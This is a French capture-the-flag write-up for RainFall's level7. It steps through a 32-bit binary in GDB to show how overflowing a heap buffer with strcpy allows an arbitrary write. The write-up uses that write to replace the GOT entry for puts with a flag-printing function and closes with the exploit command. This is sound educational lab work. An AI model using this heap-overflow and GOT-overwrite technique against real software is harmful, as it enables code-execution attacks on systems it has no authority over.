Legend:
=> endroit ou l on est dans GDB
*=> Moments cle qui aboutissent a l exploitation

Variables utiles:
argv[1]: 0xbffff8e0
argv[2]: 0xbffff8f5
malloc_1: 0x0804a008
malloc_2: 0x0804a018
malloc_3: 0x0804a028
malloc_3+4: 0x804a02c
malloc_4: 0x0804a038


=> <+3>: and esp,0xfffffff0
(gdb) x/20wx $esp
0xbffff708:     0x00000000      0xb7e454d3      0x00000003      0xbffff7a4
0xbffff718:     0xbffff7b4      0xb7fdc858      0x00000000      0xbffff71c
0xbffff728:     0xbffff7b4      0x00000000      0x0804825c      0xb7fd0ff4
0xbffff738:     0x00000000      0x00000000      0x00000000      0x9faf8153
0xbffff748:     0xa8e88543      0x00000000      0x00000000      0x00000000
(gdb) x/wx $esp+12
0xbffff714:     0xbffff7a4
(gdb) x/wx 0xbffff7a4
0xbffff7a4:     0xbffff8c7
(gdb) x/10s 0xbffff8c7
0xbffff8c7:      "/home/user/level7/level7"
0xbffff8e0:      'A' <repeats 20 times>
0xbffff8f5:      'B' <repeats 20 times>
0xbffff90a:      "SHELL=/bin/bash"

=> <+6>: sub esp,0x20
(gdb) x/20wx $esp
0xbffff700:     0x08048610      0x00000000      0x00000000      0xb7e454d3
0xbffff710:     0x00000003      0xbffff7a4      0xbffff7b4      0xb7fdc858
0xbffff720:     0x00000000      0xbffff71c      0xbffff7b4      0x00000000
0xbffff730:     0x0804825c      0xb7fd0ff4      0x00000000      0x00000000
0xbffff740:     0x00000000      0x9faf8153      0xa8e88543      0x00000000

=> <+9>: mov DWORD PTR [esp],0x8
(gdb) x/20wx $esp
0xbffff6e0:     0xffffffff      0xb7e5edc6      0xb7fd0ff4      0xb7e5ee55
0xbffff6f0:     0xb7fed280      0x00000000      0x08048619      0xb7fd0ff4
0xbffff700:     0x08048610      0x00000000      0x00000000      0xb7e454d3
0xbffff710:     0x00000003      0xbffff7a4      0xbffff7b4      0xb7fdc858
0xbffff720:     0x00000000      0xbffff71c      0xbffff7b4      0x00000000

*=> <+16>: call   0x80483f0 <malloc@plt>: malloc(8) -> 0x0804a008 malloc_1

=> <+21>: mov DWORD PTR [esp+0x1c],eax : Push de malloc_1 dans la valeur de esp+28
   0xbffff6fc->0x0804a008->(0x00000000)

=> <+29>: mov DWORD PTR [eax],0x1: On met 0x1 dans malloc_1
(gdb) x/x $eax
0x0804a008: 0x00000001

=> <+35>: mov DWORD PTR [esp],0x8: Push de 0x8 sur la stack
(gdb) x/20xw $esp
0xbffff6e0:     0x00000008      0xb7e5edc6      0xb7fd0ff4      0xb7e5ee55
0xbffff6f0:     0xb7fed280      0x00000000      0x08048619      0x0804a008
0xbffff700:     0x08048610      0x00000000      0x00000000      0xb7e454d3
0xbffff710:     0x00000003      0xbffff7a4      0xbffff7b4      0xb7fdc858
0xbffff720:     0x00000000      0xbffff71c      0xbffff7b4      0x00000000

*=> <+42>: call 0x80483f0 <malloc@plt> malloc(8) -> 0x804a018 malloc_2

=> <+47>: mov edx,eax: On met l'adresse de malloc_2 dans l'adresse de $edx

=> <+49>: mov eax,DWORD PTR [esp+0x1c]: on met l adresse de malloc_1 dans $eax

*=> <+53>: mov DWORD PTR [eax+0x4],edx : On met l'adresse de malloc_2 dans la valeur de malloc_1 + 4

=> <+56>: mov DWORD PTR [esp],0x8 : On met 0 en valeur sur la stack

*=> <+63>: call 0x80483f0 <malloc@plt> : malloc(8)
malloc_3 -> 0x0804a028

=> <+68>: mov DWORD PTR [esp+0x18],eax : on met l'adresse de malloc_3 dans la valeur de esp+0x18
(gdb) x/x $esp+0x18
0xbffff6f8:     0x0804a028

=> <+76>: mov DWORD PTR [eax],0x2 : On met 0x2 dans la valeur de malloc_3
(gdb) x/x $eax
0x804a028:      0x00000002

=> <+82>: mov DWORD PTR [esp],0x8 : On met 8 dans la valeur de esp

*=> <+89>:    call   0x80483f0 <malloc@plt> : malloc(8) malloc_4
malloc_4 -> 0x0804a038

=> <+94>: mov edx,eax : addresse de malloc_4 dans l adresse de $edx

=> <+96>: mov eax,DWORD PTR [esp+0x18] : On met l'adresse de malloc_3 dans $eax

=> <+100>: mov DWORD PTR [eax+0x4],edx : on met l adresse de malloc_4 dans malloc_3+4
(gdb) x/x $eax+4
0x804a02c:      0x0804a038

=> <+103>: mov eax,DWORD PTR [ebp+0xc] : On met une adresse qui pointe sur l'adresse de argv[0] du main dans $eax
(gdb) x/xw $ebp+0xc
0xbffff714:     0xbffff7a4
(gdb) x/xw 0xbffff7a4
0xbffff7a4:     0xbffff8c7
(gdb) x/s 0xbffff8c7
0xbffff8c7:      "/home/user/level7/level7"

=> <+106>: add eax,0x4 : On ajoute 4 a l adresse pour arriver a l adresse de argv[1]

=><+109>: mov eax,DWORD PTR [eax] : On met l'adresse direct de argv[1] comme adresse de $eax
(gdb) x/xw $eax
0xbffff8e0:     0x41414141


*=> <+111>: mov edx,eax : on met l adresse de argv[1] dans $edx
(gdb) x/xw $edx
0xbffff8e0:     0x41414141

*=> <+113>: mov eax,DWORD PTR [esp+0x1c] : on met l'adresse de malloc_1 dans $eax
(gdb) x/x $eax
0x804a008:      0x00000001

=> <+117>: mov eax,DWORD PTR [eax+0x4] : on prend l'adresse de malloc_2 dans $eax
(gdb) x/x $eax
0x804a018:      0x00000000

=> <+120>: mov DWORD PTR [esp+0x4],edx : on met l adresse de l'adresse de argv[1] dans la valeur de $esp+4

=> <+124>: mov DWORD PTR [esp],eax : on met l'adresse de malloc_2 dans la valeur de $esp

**=> <+127>: call 0x80483e0 <strcpy@plt> : strcpy(malloc_2, argv[1])
     Ici on va copier argv[1] dans malloc[2] et donc depasser autant que l on veut si besoin !

=> <+132>: mov eax,DWORD PTR [ebp+0xc] : On met l adresse qui contient l adresse d'argv[0] dans $eax

=> <+135>: add eax,0x8 : on ajoute 8 a $eax pour arriver a l'adresse qui contient l'adresse de argv[2]
(gdb) x/xw $eax
0xbffff7ac:     0xbffff8f5
(gdb) x/s 0xbffff8f5
0xbffff8f5:      'B' <repeats 20 times>

=> <+138>: mov eax,DWORD PTR [eax] : On met l'adresse direct de argv[2] dans $eax
(gdb) x/s $eax
0xbffff8f5:      'B' <repeats 20 times>

=> <+140>: mov edx,eax : On met l adresse de $eax dans l adresse de $edx

=> <+142>: mov eax,DWORD PTR [esp+0x18] : on met l adresse de malloc_3 dans l adresse de $eax
(gdb) x/xw $esp+0x18
0xbffff6f8:     0x0804a028
(gdb) x/xw 0x0804a028
0x804a028:      0x41414141
    ->(gdb) x/x $eax
    ->0x804a028:      0x41414141

**=> <+146>: mov eax,DWORD PTR [eax+0x4] : On met le contenu de la valeur finale de malloc_3+4 dans l'adresse d'$eax /!\ Donc si j ai bien compris, c'est argv[1][20:24]
(gdb) x/x $eax+4
0x804a02c:      0x0804a000
     ->(gdb) x/x $eax
     ->0x804a000:      0x00000000
/!\ C'est quelque chose que l'on peut overwrite /!\

=> <+149>: mov DWORD PTR [esp+0x4],edx : on met l adresse de argv[2] dans la valeur d'$esp+4

=> <+153>: mov DWORD PTR [esp],eax on met le contenu de malloc_3+4 dans la valeur d'$esp

**=> <+156>: call 0x80483e0 <strcpy@plt> : strcpy([malloc_3+4], argv[2])

donc enfaite a argv[1]+20 on met une adresse et on ecris dedans avec argv[2]


Explication simplifiee:
dans le premier strcpy(malloc_2, argv[1]), on peut deborder sur malloc_3+4.
La valeur de malloc_3+4 deviendra l adresse dans laquelle on va ecrire avec strcpy(malloc_3+4, argv[2])
On peut donc ecrire une adresse d'une autre fonction dans cette adresse et la nouvelle fonction sera appeler a la place de l'ancienne

Dans la fonction "m" on recupere le resultat de la fonction fgets a *main+202 qui est stocker dans l adresse 0x8049960 et l affiche, on affiche aussi le decompte des secondes passees depuis l annee 1970, mais cela ne nous interesse pas.

Nous allons donc remplacer l adresse de puts par l adresse de la fonction "m"

Nous pouvons recuperer l adresse de puts sur la global offset table avec la commande suivante:

level7@RainFall:~$ objdump -R level7
level7:     file format elf32-i386
DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen

et voici l adresse de la fonction "m":
(gdb) x/wx m
0x80484f4 <m>:  0x83e58955


La commande suivante recupere le flag:
./level7 $(python -c "print '\x41' * 20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")









